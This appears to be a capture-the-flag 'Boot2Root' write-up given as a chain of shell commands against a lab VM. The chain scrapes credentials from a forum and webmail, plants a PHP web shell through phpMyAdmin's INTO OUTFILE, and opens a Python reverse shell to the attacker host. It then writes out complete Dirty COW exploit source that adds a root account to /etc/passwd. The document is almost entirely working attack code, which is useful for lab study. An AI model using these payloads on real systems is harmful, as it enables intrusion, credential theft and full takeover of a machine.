## Find our HOST machine IP
```shell
HOST_IP=`ifconfig en0 | grep inet | awk '{print $2}'`
echo $HOST_IP
```

## Find our VM IP
```shell
IP=`prlctl list -f | grep "Boot2Root" | awk '{print $3}'`
echo $IP
```

## Scan VM IP by dirb
```shell
dirb https://$IP scripts/writeup1/wordlist.txt -r | grep "DIRECTORY:"
```

## Inspect Forum

### Get forum login
```shell
forum_login=`curl https://$IP/forum/index.php\?id\=6 -k -s | grep "for user" | grep "uid=1040" | awk '{print $11}'`
echo $forum_login
```

### Get forum password
```shell
forum_password=`curl https://$IP/forum/index.php\?id\=6 -k -s | grep password | grep 57764 | awk '{print $11}'`
echo $forum_password
```

### Try to auth
```shell
forum_cookie_path="scripts/writeup1/forum_cookie.txt"
curl https://$IP/forum/index.php -k -X POST --data-raw "mode=login&username=$forum_login&userpw=$forum_password" -c $forum_cookie_path
echo "Complete"
```

### Get email address
```shell
email=`curl https://$IP/forum/index.php\?mode\=user\&action\=edit_profile -k -b $forum_cookie_path -s | grep -E -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b" | head -n 1`
echo $email
```

## Inspect Webmail

### Try to auth
```shell
webmail_cookie_path="scripts/writeup1/webmail_cookie.txt"
curl https://$IP/webmail/src/redirect.php -k -X POST --data-raw "login_username=$email&secretkey=$forum_password&s_autodetect_results=1&just_logged_in=1" -c $webmail_cookie_path
echo "Complete"
```

### Get database login
```shell
db_login=`curl https://$IP/webmail/src/read_body.php\?mailbox\=INBOX\&passed_id\=2\&startMessage\=1 -k -b $webmail_cookie_path -s | grep "databases" | awk '{print $9}' | cut -d "/" -f 1`
echo "$db_login" > scripts/writeup1/db_login
echo $db_login
```

### Get database password
```shell
db_password=`curl https://$IP/webmail/src/read_body.php\?mailbox\=INBOX\&passed_id\=2\&startMessage\=1 -k -b $webmail_cookie_path -s | grep "databases" | awk '{print $9}' | cut -d "/" -f 2`
echo "$db_password" > scripts/writeup1/db_password
echo $db_password
```

## Inspect Database (PhpMyAdmin)

### Auth and get token
```shell
db_cookie_path="scripts/writeup1/db_cookie.txt"
curl https://$IP/phpmyadmin/index.php -X POST -k -c $db_cookie_path --data-raw "pma_username=$db_login&pma_password=$db_password" 2>/dev/null | grep "token" | head -n 1 | cut -d "=" -f 8 | cut -d "&" -f 1
token=`curl https://$IP/phpmyadmin/index.php -k -b $db_cookie_path 2>/dev/null | grep "token" | head -n 1 | cut -d "=" -f 3 | cut -d "'" -f 1`
echo $token
```

### Inject executor
```sql
SELECT 1, '<?php system($_GET["execute"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/executor.php'
```
Execute by POST request
```shell
curl https://$IP/phpmyadmin/import.php -X POST -k -b $db_cookie_path --data-raw "is_js_confirmed=0&token=$token&pos=0&goto=server_sql.php&message_to_show=SQL-%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81+%D0%B1%D1%8B%D0%BB+%D1%83%D1%81%D0%BF%D0%B5%D1%88%D0%BD%D0%BE+%D0%B2%D1%8B%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD&prev_sql_query=&sql_query=SELECT+1%2C+'%3C%3Fphp+system(%24_GET%5B%22execute%22%5D.%22+2%3E%261%22)%3B+%3F%3E'+INTO+OUTFILE+'%2Fvar%2Fwww%2Fforum%2Ftemplates_c%2Fexecutor.php'&bkm_label=&sql_delimiter=%3B&show_query=1&ajax_request=true"
```

At now, we can execute any command provide by ?execute query parameter at /forum/templates_c/executor.php

### Intercept stdin and stdout
Declare executor
```shell
executor () {
  cmd=`echo "$1" | sed 's/ /%20/g'`
  curl -s -k https://$IP/forum/templates_c/executor.php?execute=$cmd
}
reverse_shell () {
  screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
  screen -dmS ncat bash -c 'sleep 1; ncat -nvklp 1234'
  reverse_shell_cmd="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST_IP\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/bash\");'"
  sleep 3
  executor $reverse_shell_cmd &
  screen -r ncat && kill %2
}
```
### Run reverse shell
```shell
reverse_shell
```

### Dirty cow exploit
#### At terminal where run ncat with intercepted /bin/bash, just past this
##### Write dirty cow source code
```shell
cat > /tmp/dirty.c << EOF
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "lrorscha";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "lrorscha";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
EOF
```

##### Compile binary
```shell
executor "gcc /tmp/dirty.c -o /tmp/dirty -pthread -lcrypt"
```

##### Execute binary and set password
```shell
executor "rm -f /tmp/passwd.bak"
echo $IP > scripts/writeup1/ip
screen -dm bash -c 'sleep 1; bash scripts/writeup1/executor.sh "/tmp/dirty test" `cat scripts/writeup1/ip`'
sleep 5
rm scripts/writeup1/ip
screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
sleep 30
```

And just follow the dirty tips

We are root, congrats!
